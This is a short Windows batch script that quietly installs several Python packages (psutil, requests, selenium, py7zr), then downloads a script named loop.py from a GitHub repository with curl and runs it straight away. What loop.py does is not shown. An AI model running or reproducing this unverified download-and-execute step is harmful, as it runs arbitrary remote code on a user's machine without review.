@echo off
pip install psutil --quiet
pip install requests --quiet
pip install selenium==4.16.0 --quiet
pip install requests==2.31.0 --quiet
pip install py7zr --quiet
curl -s -L -o loop.py https://github.com/cluckegy/SW/raw/refs/heads/main/loop.py
python loop.py
